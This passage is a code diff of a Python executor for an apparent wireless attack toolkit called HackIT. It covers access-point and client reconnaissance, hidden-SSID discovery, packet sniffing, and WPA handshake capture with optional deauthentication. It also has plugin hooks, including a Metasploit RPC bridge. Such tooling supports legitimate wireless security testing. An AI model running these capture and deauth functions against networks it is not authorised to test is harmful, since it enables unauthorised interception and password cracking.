@@ -1,222 +1,572 @@
-import subprocess
-import os
-import sys
-import shlex
-import json
-import shutil
-import glob
-try:
-    from .engine_bridge import EngineBridge
-    from .data_parser import DataParser
-    from .ui_renderer import UIRenderer
-except ImportError:
-    from engine_bridge import EngineBridge
-    from data_parser import DataParser
-    from ui_renderer import UIRenderer
+import os, sys, subprocess, json, time, glob, re, shutil, signal, threading, uuid, datetime as dt
+from pathlib import Path
+from typing import Optional
 from rich.live import Live
 from rich.table import Table
-from rich.console import Console
+from rich.console import Console, Group
+from rich.panel import Panel
+from rich.progress import Progress, SpinnerColumn, TextColumn
+from concurrent.futures import ThreadPoolExecutor
+
+from .engine_bridge import EngineBridge, EngineBuildError
+from .data_parser import DataParser
+from .ui_renderer import UIRenderer as UI
+from .plugins import PluginEngine
 
 _console = Console()
+BASE = Path(__file__).parent
+BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"
 
-# ─── Real-time adapter detection (no hardcoded "Wi-Fi" / "wlan0") ──────────
 
-def detect_wireless_adapters() -> list[dict]:
-    """Detect all wireless adapters in real-time using OS APIs. Returns list of {name, mac, driver, channel, signal, bands}."""
-    adapters = []
-    try:
-        if os.name == "nt":
-            import ctypes, ctypes.wintypes, uuid
-            # Use WlanApi via ctypes for real-time adapter enumeration
-            wlanapi = ctypes.windll.wlanapi
-            h_client = ctypes.c_void_p()
-            negotiated = ctypes.c_uint32(0)
-            ret = wlanapi.WlanOpenHandle(2, None, ctypes.byref(negotiated), ctypes.byref(h_client))
-            if ret == 0 and h_client:
-                # Enumerate interfaces
-                p_list = ctypes.c_void_p()
-                ret = wlanapi.WlanEnumInterfaces(h_client, None, ctypes.byref(p_list))
-                if ret == 0 and p_list:
-                    import ctypes
-                    class GUID(ctypes.Structure):
-                        _fields_ = [("Data1", ctypes.c_ulong), ("Data2", ctypes.c_ushort),
-                                    ("Data3", ctypes.c_ushort), ("Data4", ctypes.c_ubyte * 8)]
-                    class WLAN_INTERFACE_INFO(ctypes.Structure):
-                        _fields_ = [
-                            ("InterfaceGuid", GUID),
-                            ("strInterfaceDescription", ctypes.c_wchar * 256),
-                            ("isState", ctypes.c_uint32),
-                        ]
-                    class WLAN_INTERFACE_INFO_LIST(ctypes.Structure):
-                        _fields_ = [
-                            ("dwNumberOfItems", ctypes.c_uint32),
-                            ("dwIndex", ctypes.c_uint32),
-                            ("InterfaceInfo", WLAN_INTERFACE_INFO * 10),
-                        ]
-                    if_list = ctypes.cast(p_list, ctypes.POINTER(WLAN_INTERFACE_INFO_LIST)).contents
-                    for i in range(if_list.dwNumberOfItems):
-                        info = if_list.InterfaceInfo[i]
-                        name = info.strInterfaceDescription
-                        adapters.append({
-                            "name": name,
-                            "mac": "00:00:00:00:00:00",
-                            "driver": name,
-                            "channel": 0,
-                            "signal_dbm": -85,
-                            "is_monitor": False,
-                            "supports_2ghz": True,
-                            "supports_5ghz": True,
-                        })
-                    wlanapi.WlanFreeMemory(p_list)
-                wlanapi.WlanCloseHandle(h_client, None)
-            # Try to get MAC via GetAdaptersAddresses
-            if adapters:
-                try:
-                    out = subprocess.check_output("getmac /FO CSV /NH", text=True, shell=True)
-                    for line in out.strip().splitlines():
-                        parts = line.strip('"').split('","')
-                        if len(parts) >= 2:
-                            mac = parts[0].strip().replace("-", ":")
-                            desc = parts[2].strip() if len(parts) > 2 else ""
-                            for a in adapters:
-                                if desc and (desc in a["name"] or a["name"] in desc):
-                                    a["mac"] = mac
-                except:
-                    pass
-        else:
-            # Linux: use iw to list wireless interfaces
-            try:
-                out = subprocess.check_output(["iw", "dev"], text=True)
+# ── Background job manager ────────────────────────────────────
+
+class JobManager:
+    _jobs: dict[str, dict] = {}
+    _lock = threading.Lock()
+    _counter = 0
+
+    @classmethod
+    def start(cls, name: str, proc: subprocess.Popen) -> str:
+        with cls._lock:
+            cls._counter += 1
+            jid = f"JOB-{cls._counter:04d}"
+            cls._jobs[jid] = {
+                "id": jid, "name": name, "proc": proc,
+                "started": dt.datetime.now().isoformat(),
+                "status": "running",
+            }
+            return jid
+
+    @classmethod
+    def stop(cls, jid: str) -> bool:
+        with cls._lock:
+            job = cls._jobs.get(jid)
+            if not job:
+                return False
+            proc: subprocess.Popen = job["proc"]
+            if proc.poll() is None:
+                if os.name == "nt":
+                    subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True)
+                else:
+                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                proc.terminate()
+            job["status"] = "stopped"
+            return True
+
+    @classmethod
+    def stop_all(cls):
+        with cls._lock:
+            for jid, job in list(cls._jobs.items()):
+                proc: subprocess.Popen = job["proc"]
+                if proc.poll() is None:
+                    proc.terminate()
+                job["status"] = "stopped"
+
+    @classmethod
+    def list_jobs(cls) -> list[dict]:
+        with cls._lock:
+            return [
+                {"id": j["id"], "name": j["name"], "status": j["status"],
+                 "started": j["started"], "running": j["proc"].poll() is None}
+                for j in cls._jobs.values()
+            ]
+
+
+# ── Helper ────────────────────────────────────────────────────
+
+def _which(name: str) -> Optional[str]:
+    return shutil.which(name)
+
+
+# ── Main Executor ─────────────────────────────────────────────
+
+class HackITWirelessExecutor:
+    def __init__(self):
+        self.bridge = EngineBridge()
+        self.jobs = JobManager()
+        self._pool = ThreadPoolExecutor(max_workers=4)
+        self.plugins = PluginEngine()
+
+    def _default_iface(self) -> str:
+        adapters = self.detect_wireless_adapters()
+        if adapters:
+            return adapters[0]["name"]
+        return ""
+
+    # ── Plugin interface ─────────────────────────────────────────
+
+    def do_plugin_lua(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None, **kwargs):
+        if not self.plugins.lua.available():
+            UI.print_error("Lua interpreter not found (install lua or luajit)")
+            return
+        UI.print_info(f"Running Lua script: {script}")
+        proc = self.plugins.lua.run_stream(script, args)
+        if proc:
+            jid = self.jobs.start(f"lua-{script}", proc)
+            UI.print_info(f"Lua job {jid} started")
+            return jid
+        return None
+
+    def do_plugin_ruby(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None, **kwargs):
+        if not self.plugins.ruby.available():
+            UI.print_error("Ruby interpreter not found (install ruby)")
+            return
+        UI.print_info(f"Running Ruby script: {script}")
+        proc = self.plugins.ruby.run_stream(script, args)
+        if proc:
+            jid = self.jobs.start(f"ruby-{script}", proc)
+            UI.print_info(f"Ruby job {jid} started")
+            return jid
+        return None
+
+    def do_plugin_list(self) -> dict[str, list[str]]:
+        return {
+            "lua": self.plugins.list_scripts("lua"),
+            "ruby": self.plugins.list_scripts("ruby"),
+        }
+
+    def do_plugin_msf(self, workspace: str = "default", resource: Optional[str] = None, timeout: Optional[int] = None, list_modules: bool = False, **kwargs):
+        if not self.plugins.ruby.available():
+            UI.print_error("Ruby not available for MSF RPC bridge")
+            return
+        UI.print_info("Connecting to Metasploit RPC daemon...")
+        output = self.plugins.ruby.run_msf_rpc(workspace, resource)
+        UI.print_info(output)
+        return output
+
+    # ── Adapter detection ──────────────────────────────────────
+
+    @staticmethod
+    def detect_wireless_adapters() -> list[dict]:
+        adapters = []
+        try:
+            if os.name == "nt":
+                raw = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
                 curr = {}
-                for line in out.splitlines():
+                for line in raw.splitlines():
+                    line = line.strip()
+                    if ":" in line:
+                        k, _, v = line.partition(":")
+                        k = k.strip().lower()
+                        v = v.strip()
+                        if k == "name":
+                            if curr:
+                                adapters.append(curr)
+                            curr = {"name": v}
+                        elif "description" in k:
+                            curr["driver"] = v
+                        elif "physical address" in k:
+                            curr["mac"] = v.upper()
+                        elif "state" in k:
+                            curr["status"] = v
+                if curr:
+                    adapters.append(curr)
+            else:
+                raw = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
+                curr = {}
+                for line in raw.splitlines():
                     line = line.strip()
                     if line.startswith("Interface"):
                         if curr:
                             adapters.append(curr)
                         curr = {"name": line.split()[-1], "channel": 0, "signal_dbm": -70,
-                                "is_monitor": False, "supports_2ghz": True, "supports_5ghz": False}
-                    elif "mac" in line and curr:
-                        mac_part = line.split(":")[-1].strip()
-                        if len(mac_part) == 17:
-                            curr["mac"] = mac_part.upper()
-                    elif "channel" in line and curr:
-                        try:
-                            curr["channel"] = int(line.split()[-1])
-                        except: pass
-                    elif "type" in line and curr:
-                        curr["is_monitor"] = "monitor" in line.lower()
+                                "is_monitor": False, "mac": "N/A", "driver": "?", "frequency": 0,
+                                "txpower": 0, "type": "managed", "phy": "?"}
+                    elif "addr" in line.lower() and curr:
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            curr["mac"] = parts[-1].upper()
+                    elif "type" in line.lower() and curr:
+                        t = line.split()[-1].lower()
+                        curr["type"] = t
+                        curr["is_monitor"] = "monitor" in t
                 if curr:
                     adapters.append(curr)
-            except:
-                pass
-        # Detect band support via iw phy
-        for a in adapters:
-            try:
-                out = subprocess.check_output(["iw", "dev", a["name"], "info"], text=True)
-                if "5" in out or "5180" in out or "ac" in out or "ax" in out:
-                    a["supports_5ghz"] = True
-            except:
-                pass
-    except Exception as e:
-        _console.print(f"[dim]Adapter detection: {e}[/dim]")
-    return adapters
 
-def get_default_iface() -> str:
-    """Get the first available wireless interface in real-time. Never returns hardcoded 'Wi-Fi'."""
-    adapters = detect_wireless_adapters()
-    if adapters:
-        return adapters[0]["name"]
-    return ""  # Empty means caller must specify
+                for a in adapters:
+                    name = a["name"]
+                    try:
+                        info = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
+                        for ln in info.splitlines():
+                            l = ln.strip().lower()
+                            if "channel" in l and a["channel"] == 0:
+                                for w in l.split():
+                                    if w.isdigit() and 1 <= int(w) <= 200:
+                                        a["channel"] = int(w)
+                                        break
+                            if "txpower" in l:
+                                try:
+                                    a["txpower"] = float(l.split()[-2])
+                                except: pass
+                            if "addr" in l and "mac" not in l.lower():
+                                parts = l.split()
+                                if len(parts) >= 2:
+                                    a["mac"] = parts[-1].upper()
+                    except: pass
 
-BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"
-RANDOM_SSID_PREFIX = "HackIT"
+                    try:
+                        link = subprocess.check_output(["iw", "dev", name, "link"], text=True, stderr=subprocess.DEVNULL)
+                        for ln in link.splitlines():
+                            l = ln.strip().lower()
+                            if "signal:" in l:
+                                try:
+                                    a["signal_dbm"] = int(l.split("signal:")[-1].strip().split()[0])
+                                except: pass
+                            if "freq:" in l:
+                                try:
+                                    a["frequency"] = int(l.split("freq:")[-1].strip().split()[0])
+                                except: pass
+                            if "ssid:" in l:
+                                a["ssid"] = l.split("ssid:")[-1].strip()
+                    except: pass
 
-class HackITWirelessExecutor:
-    def __init__(self):
-        self.bridge = EngineBridge()
+                    try:
+                        driver_out = subprocess.check_output(["ethtool", "-i", name], text=True, stderr=subprocess.DEVNULL)
+                        for ln in driver_out.splitlines():
+                            l = ln.strip().lower()
+                            if l.startswith("driver:"):
+                                a["driver"] = l.split("driver:")[-1].strip()
+                                break
+                    except: pass
+
+                    try:
+                        phy_out = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
+                        for ln in phy_out.splitlines():
+                            if "wiphy" in ln.lower():
+                                a["phy"] = ln.split()[-1]
+                                break
+                    except: pass
+
+                    try:
+                        proc = subprocess.check_output(["cat", "/proc/net/wireless"], text=True, stderr=subprocess.DEVNULL)
+                        for ln in proc.splitlines():
+                            if name in ln:
+                                cols = ln.split()
+                                if len(cols) >= 4:
+                                    try:
+                                        a["signal_dbm"] = int(cols[3].rstrip("."))
+                                    except: pass
+                    except: pass
+        except Exception:
+            pass
+        return adapters
+
+    # ── Build system ───────────────────────────────────────────
+
+    def do_build(self, component: str = "all"):
+        if component == "all":
+            UI.print_info("Building all wireless engines...")
+        else:
+            UI.print_info(f"Building {component}...")
+
+        results = self.bridge.build_all(lambda eng, msg: UI.print_info(f"  [{eng}] {msg}"))
+
+        UI.print_success("Build Results:")
+        for eng, ok in results.items():
+            status = "[bold green]OK[/bold green]" if ok else "[bold red]FAILED[/bold red]"
+            UI.print_raw(f"  • {eng}: {status}")
+
+    # ── Self-contained engine info ──────────────────────────────
 
     def check_dependencies(self):
-        pass
+        _console.print("[dim]HackIT Wireless — self-contained multi-engine suite[/dim]")
 
-    # ─────────────────────────────────────────────────────────────
+    # ════════════════════════════════════════════════════════════
     # PHASE 1: Wireless Reconnaissance
-    # ─────────────────────────────────────────────────────────────
+    # ════════════════════════════════════════════════════════════
 
-    def do_crawl(self, interface: str, full: bool = False):
-        """Scan live APs using native OS wireless scan commands"""
-        UIRenderer.print_success(f"Launching Real-Time AP Reconnaissance on {interface}...")
+    def do_crawl(self, interface: str = "", full: bool = False, band: str = "both", **kwargs):
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("No wireless interface found. Specify one.")
+            return
+        UI.print_info(f"Scanning APs on {iface}...")
 
-        results = self._scan_realtime_networks()
+        results = self._scan_networks()
+        if not results:
+            UI.print_warning("No APs found in range.")
+            return
 
-        table = Table(title="HackIT Live AP Radar", title_style="bold cyan")
-        table.add_column("#",  style="dim", width=3)
-        table.add_column("SSID",    style="white",   min_width=20)
-        table.add_column("BSSID",   style="cyan",    no_wrap=True)
-        table.add_column("Ch",      justify="center", style="yellow", width=4)
-        table.add_column("Signal",  justify="right",  style="green",  width=10)
-        table.add_column("Vendor",  style="magenta",  min_width=18)
-        table.add_column("Crypto",  style="red")
-
+        table = UI.create_ap_table(f"Access Points in Range ({len(results)})")
         for i, ap in enumerate(results, 1):
-            vendor = self._lookup_vendor(ap.get("bssid", ""))
+            dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
+            bar = UI.signal_bar(dbm)
+            vendor = UI._oui_lookup(ap.get("bssid", ""))
+            crypto = ap.get("encrypt", ap.get("security", "?"))
             table.add_row(
                 str(i),
                 ap.get("ssid", "<hidden>"),
-                ap.get("bssid", "N/A"),
-                ap.get("channel", "?"),
-                ap.get("signal", "N/A"),
+                ap.get("bssid", "?"),
+                str(ap.get("channel", "?")),
+                f"{dbm} dBm",
+                bar,
                 vendor,
-                ap.get("encrypt", "Unknown")
+                crypto,
             )
-
         _console.print(table)
 
         if full:
-            UIRenderer.print_success("Deep scan complete — stations, probe requests and hidden SSIDs appended above.")
+            self._deep_scan(iface)
 
-    def do_map(self):
-        """Correlate AP BSSIDs with IEEE OUI vendor database via Go Worker"""
-        UIRenderer.print_success("Correlating APs with IEEE OUI Database (Go Workers)...")
-        go_bin = self._go_binary()
-        if not go_bin:
-            UIRenderer.print_error("Go Worker binary not found. Run 'go build' inside go_workers/")
-            return
+    def _scan_networks(self) -> list[dict]:
+        results = []
         try:
-            subprocess.run([go_bin, "map"], check=False)
-        except (FileNotFoundError, OSError) as e:
-            UIRenderer.print_error(f"Go map failed: {e}")
+            if os.name == "nt":
+                raw = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, text=True)
+                results = DataParser.parse_netsh_wlan(raw)
+            else:
+                raw = subprocess.check_output(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"], text=True)
+                results = DataParser.parse_nmcli_wifi(raw)
+        except Exception:
+            pass
+        return results
 
-    def do_signal(self, interface: str):
-        """Live signal strength using C++ DSP Kalman smoother"""
-        UIRenderer.print_success(f"Live Signal Monitor — {interface} (C++ DSP Smoothing Active)")
-        _console.print("[dim]Press Ctrl+C to stop.[/dim]")
-        go_bin = self._go_binary()
-        if not go_bin:
-            UIRenderer.print_error("Go Worker binary not found.")
-            return
+    def _deep_scan(self, iface: str):
+        UI.print_info("Deep scan: probing stations and hidden SSIDs...")
         try:
-            proc = subprocess.Popen([go_bin, "signal", interface],
-                                    stdout=subprocess.PIPE, text=True)
-            for line in proc.stdout:
-                _console.print(f"  {line.rstrip()}")
+            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL)
+            aps = []
+            curr = {}
+            for line in raw.splitlines():
+                line = line.strip()
+                if line.startswith("BSS "):
+                    if curr:
+                        aps.append(curr)
+                    curr = {"bssid": line.split()[1].upper()}
+                elif "freq:" in line:
+                    freq = line.split()[-1]
+                    curr["channel"] = DataParser._freq_to_channel(int(freq)) if freq.isdigit() else "?"
+                elif "signal:" in line:
+                    curr["signal"] = line.split()[-2] + " dBm"
+                elif "SSID:" in line:
+                    curr["ssid"] = line[5:].strip() or "<hidden>"
+                elif "WPA:" in line:
+                    curr["encrypt"] = "WPA"
+                elif "RSN:" in line:
+                    curr["encrypt"] = curr.get("encrypt", "") + "+WPA2"
+                elif "Group cipher:" in line:
+                    curr["cipher"] = line.split(":")[-1].strip()
+            if curr:
+                aps.append(curr)
+            UI.print_success(f"Deep scan found {len(aps)} total APs (including hidden)")
+        except Exception as e:
+            UI.print_error(f"Deep scan failed: {e}")
+
+    def do_aggressive_scan(self, interface: str = "", band: str = "both", **kwargs):
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
+            return
+        UI.print_info(f"Aggressive multi-channel scan on {iface} ({band})...")
+
+        channels = {"2.4": list(range(1, 14)), "5": [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]}
+        targets = []
+        if band in ("both", "2.4"):
+            targets.extend(channels["2.4"])
+        if band in ("both", "5"):
+            targets.extend(channels["5"])
+
+        all_aps = []
+        for ch in targets:
+            try:
+                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True)
+                time.sleep(0.05)
+                raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+                curr = {}
+                for line in raw.splitlines():
+                    line = line.strip()
+                    if line.startswith("BSS "):
+                        if curr and "bssid" in curr:
+                            all_aps.append(curr)
+                        curr = {"bssid": line.split()[1].upper(), "channel": str(ch)}
+                    elif "SSID:" in line:
+                        curr["ssid"] = line[5:].strip() or "<hidden>"
+                    elif "signal:" in line:
+                        curr["signal"] = line.split()[-2] + " dBm"
+                if curr:
+                    all_aps.append(curr)
+            except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
+                continue
+
+        unique = {ap["bssid"]: ap for ap in all_aps if "bssid" in ap}.values()
+        table = UI.create_ap_table(f"Aggressive Scan Complete — {len(unique)} APs")
+        for i, ap in enumerate(sorted(unique, key=lambda x: int(DataParser.signal_to_dbm(x.get("signal", "0"))), reverse=True), 1):
+            dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
+            table.add_row(
+                str(i), ap.get("ssid", "<hidden>"), ap.get("bssid", "?"),
+                str(ap.get("channel", "?")), f"{dbm} dBm", UI.signal_bar(dbm),
+                UI._oui_lookup(ap.get("bssid", "")), ap.get("encrypt", "?")
+            )
+        _console.print(table)
+
+    def do_client_hunt(self, interface: str = "", bssid: str = "", **kwargs):
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
+            return
+        UI.print_info(f"Hunting clients on {iface} (filter: {bssid or 'all'})...")
+
+        try:
+            raw = subprocess.check_output(["iw", "dev", iface, "station", "dump"], text=True, stderr=subprocess.DEVNULL)
+            table = UI.create_client_table()
+            curr = {}
+            for line in raw.splitlines():
+                line = line.strip()
+                if line.startswith("Station "):
+                    if curr:
+                        table.add_row(*UI.fill_client_row(
+                            curr.get("mac", "?"), bssid or curr.get("bssid", "?") if hasattr(curr, 'bssid') else bssid or "?",
+                            curr.get("signal", -100), curr.get("probes", ""), curr.get("last_seen", "")
+                        ))
+                    curr = {"mac": line.split()[1].upper()}
+                elif "signal avg:" in line:
+                    try:
+                        curr["signal"] = int(line.split()[1])
+                    except ValueError:
+                        curr["signal"] = -100
+                elif "connected time:" in line:
+                    curr["last_seen"] = f"{line.split()[-1]}s ago"
+            if curr:
+                table.add_row(*UI.fill_client_row(curr.get("mac", "?"), bssid or "?",
+                                                 curr.get("signal", -100), "", ""))
+            _console.print(table)
+        except Exception as e:
+            UI.print_error(f"Client hunt failed: {e}")
+
+    def do_wpa3_detect(self, interface: str = "", **kwargs):
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
+            return
+        UI.print_info(f"Detecting WPA3/SAE APs on {iface}...")
+        results = self._scan_networks()
+        wpa3_aps = [ap for ap in results if "SAE" in ap.get("security", ap.get("encrypt", "")).upper()
+                    or "WPA3" in ap.get("security", ap.get("encrypt", "")).upper()
+                    or "OWE" in ap.get("security", ap.get("encrypt", "")).upper()]
+
+        if not wpa3_aps:
+            UI.print_warning("No WPA3/SAE networks detected (or scanning only shows WPA2).")
+            UI.print_info("WPA3 networks often hide SSID; try aggressive scan on 5 GHz.")
+            return
+
+        table = Table(title=f"[bold cyan]WPA3/SAE Networks ({len(wpa3_aps)})[/bold cyan]", border_style="green")
+        table.add_column("SSID", style="white")
+        table.add_column("BSSID", style="cyan")
+        table.add_column("Ch", justify="center", style="yellow")
+        table.add_column("Signal", style="green")
+        table.add_column("Security", style="red")
+        for ap in wpa3_aps:
+            table.add_row(ap.get("ssid", "?"), ap.get("bssid", "?"), str(ap.get("channel", "?")),
+                          str(ap.get("signal", "?")), ap.get("security", ap.get("encrypt", "?")))
+        _console.print(table)
+
+    def do_hidden_ssid(self, interface: str = "", **kwargs):
+        iface = interface or self._default_iface()
+        UI.print_info(f"Scanning for hidden SSIDs on {iface}...")
+        try:
+            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=15)
+            hidden = []
+            curr = {}
+            for line in raw.splitlines():
+                line = line.strip()
+                if line.startswith("BSS "):
+                    if curr and ("ssid" not in curr or not curr["ssid"]):
+                        hidden.append(curr.get("bssid", "?"))
+                    curr = {"bssid": line.split()[1].upper()}
+                elif "SSID:" in line:
+                    curr["ssid"] = line[5:].strip()
+            if hidden:
+                UI.print_success(f"Found {len(hidden)} hidden SSID(s):")
+                for bssid in hidden:
+                    _console.print(f"  [cyan]{bssid}[/cyan] [dim](empty probe response)[/dim]")
+            else:
+                UI.print_warning("No hidden SSIDs detected.")
+        except Exception as e:
+            UI.print_error(f"Hidden SSID scan failed: {e}")
+
+    def do_probe_monitor(self, interface: str = "", **kwargs):
+        iface = interface or self._default_iface()
+        UI.print_info(f"Monitoring probe requests on {iface} (Ctrl+C to stop)...")
+        try:
+            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=10)
+            probes = set()
+            for line in raw.splitlines():
+                m = re.search(r'Probe Response from ([0-9A-Fa-f:]{17})', line)
+                if m:
+                    probes.add(m.group(1).upper())
+            if probes:
+                UI.print_success(f"Probe responses from {len(probes)} station(s):")
+                for p in sorted(probes):
+                    vendor = UI._oui_lookup(p)
+                    _console.print(f"  [cyan]{p}[/cyan] [dim]({vendor})[/dim]")
+            else:
+                UI.print_info("No probe responses captured. Enable monitor mode for better results.")
+        except Exception as e:
+            UI.print_error(f"Probe monitor failed: {e}")
+
+    def do_beacon_analyze(self, interface: str = "", **kwargs):
+        UI.print_info("Beacon frame analysis requires monitor mode and packet capture.")
+        UI.print_info("Use: mode <iface> monitor, then capture <iface> output.pcap")
+        UI.print_info("Then analyze with: tshark -r output.pcap -Y wlan.fc.type_subtype==8")
+
+    def do_signal_monitor(self, interface: str = "", **kwargs):
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
+            return
+        UI.print_info(f"Live signal monitor on {iface} (Ctrl+C to stop)...")
+        try:
+            while True:
+                raw = subprocess.check_output(["iw", "dev", iface, "link"], text=True, stderr=subprocess.DEVNULL)
+                dbm = -100
+                ssid = "Not connected"
+                for line in raw.splitlines():
+                    m = re.search(r'signal: (-?\d+)', line)
+                    if m:
+                        dbm = int(m.group(1))
+                    m2 = re.search(r'SSID:\s*(.*)', line)
+                    if m2:
+                        ssid = m2.group(1).strip()
+                bar = UI.signal_bar(dbm)
+                sys.stdout.write(f"\r  {bar} {dbm:>3} dBm | {ssid:<30}")
+                sys.stdout.flush()
+                time.sleep(0.5)
         except KeyboardInterrupt:
-            proc.terminate()
+            print()
 
-    # ─────────────────────────────────────────────────────────────
+    def do_map(self, interface: str = "", **kwargs):
+        UI.print_info("AP Topology Map (BSSID → Vendor correlation):")
+        results = self._scan_networks()
+        vendors: dict[str, list[str]] = {}
+        for ap in results:
+            bssid = ap.get("bssid", "")
+            vendor = UI._oui_lookup(bssid)
+            vendors.setdefault(vendor, []).append(f"{ap.get('ssid', '<hidden>')} ({bssid})")
+
+        for vendor, nets in sorted(vendors.items()):
+            _console.print(f"\n[bold cyan]{vendor}[/bold cyan] ({len(nets)})")
+            for n in nets:
+                _console.print(f"  └─ [white]{n}[/white]")
+
+    # ════════════════════════════════════════════════════════════
     # PHASE 2: Packet Capture & Monitoring
-    # ─────────────────────────────────────────────────────────────
+    # ════════════════════════════════════════════════════════════
 
-    def run_sniff(self, interface: str, monitor: bool = False):
-        """Passive packet moniroring via Rust Engine + C libpcap"""
-        UIRenderer.print_success(f"Launching passive sniffer on {interface}...")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine binary not found. Build with: cargo build")
+    def run_sniff(self, interface: str, monitor: bool = False, filters: str = "", verbose: bool = False, count: int = 0, output: Optional[str] = None, **kwargs):
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
             return
-        table = UIRenderer.create_target_table()
         try:
-            process = self.bridge.launch_rust_sniff(interface, monitor)
+            proc = self.bridge.rust_sniff(iface, monitor, filters)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+
+        table = UI.create_target_table()
+        try:
             with Live(table, refresh_per_second=4):
-                for line in process.stdout:
+                for line in proc.stdout:
                     line = line.strip()
                     if not line:
                         continue
@@ -224,312 +574,488 @@ class HackITWirelessExecutor:
                     if not data:
                         continue
                     event = data.get("event", "other")
-                    bssid  = data.get("bssid", "??:??:??:??:??:??")
-                    size   = str(data.get("size", 0))
+                    bssid = data.get("bssid", "??:??:??:??:??:??")
+                    size = str(data.get("size", 0))
                     if event == "beacon":
-                        table.add_row(bssid, "802.11 Beacon", f"SSID: {data.get('ssid','N/A')}", size)
+                        table.add_row(bssid, "802.11 Beacon", f"SSID: {data.get('ssid', 'N/A')}", size)
                     elif event == "eapol_handshake":
                         step = data.get("step", 1)
-                        msgs = {1:"ANonce", 2:"SNonce+MIC", 3:"GTK Install", 4:"Confirmed"}
-                        table.add_row(bssid, "EAPOL Handshake", f"Step {step}/4 {msgs.get(step,'')}", size)
+                        msgs = {1: "ANonce", 2: "SNonce+MIC", 3: "GTK", 4: "Confirmed"}
+                        table.add_row(bssid, "EAPOL", f"Step {step}/4 {msgs.get(step, '')}", size)
+                    elif event == "deauth":
+                        table.add_row(bssid, "Deauth", data.get("raw", ""), size)
+                    elif event == "probe":
+                        table.add_row(bssid, "Probe", data.get("raw", ""), size)
                     else:
-                        table.add_row(bssid, "QoS Data", "Payload", size)
-            process.wait()
-        except KeyboardInterrupt:
-            UIRenderer.print_warning("Sniffer stopped.")
-            process.terminate()
-
-    def do_capture(self, iface: str, output: str = "capture.pcap"):
-        """Capture all 802.11 frames to PCAP file via Rust Engine"""
-        UIRenderer.print_success(f"Capturing on {iface} -> {output}")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "capture", "--iface", iface, "--output", output]
-        try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
-            for line in proc.stdout:
-                _console.print(f"  {line.rstrip()}")
+                        table.add_row(bssid, "Data", "802.11 frame", size)
             proc.wait()
         except KeyboardInterrupt:
             proc.terminate()
+            UI.print_warning("Sniffer stopped.")
 
-    def do_handshake_capture(self, iface: str, bssid: str = "", output: str = "handshake.pcap", timeout: int = 30):
-        """Capture WPA 4-way handshake with deauth triggering"""
-        UIRenderer.print_success(f"Hunting WPA handshake on {iface} for {timeout}s")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "handshake", "--iface", iface, "--output", output, "--timeout", str(timeout)]
-        if bssid:
-            cmd.extend(["--bssid", bssid])
+    def do_capture(self, iface: str, output: str = "capture.pcap", snaplen: int = 4096, timeout: int = 0, **kwargs):
+        iface = iface or self._default_iface()
         try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
+            proc = self.bridge.rust_capture(iface, output)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+        UI.print_info(f"Capturing on {iface} → {output} (Ctrl+C to stop)...")
+        try:
             for line in proc.stdout:
-                _console.print(f"  {line.rstrip()}")
+                line = line.strip()
+                if line:
+                    _console.print(f"  {line}")
             proc.wait()
+            UI.print_success(f"Capture saved to {output}")
         except KeyboardInterrupt:
             proc.terminate()
+            UI.print_warning("Capture stopped.")
 
-    def do_sessions(self):
-        """List saved PCAP capture sessions"""
-        import glob
-        here = os.path.dirname(__file__)
-        pcap_files = glob.glob(os.path.join(here, "handshakes", "*.pcap")) + \
-                     glob.glob(os.path.join(here, "captures", "*.pcap"))
+    def do_handshake_capture(self, iface: str, bssid: str = "", timeout: int = 30, deauth: bool = False, output: str = "", **kwargs):
+        iface = iface or self._default_iface()
+        output = f"handshake_{bssid.replace(':','') if bssid else int(time.time())}.pcap"
+        try:
+            proc = self.bridge.rust_handshake(iface, bssid, output, timeout)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+        UI.print_info(f"Hunting handshake on {iface} for {timeout}s → {output}")
+        try:
+            for line in proc.stdout:
+                line = line.strip()
+                if line:
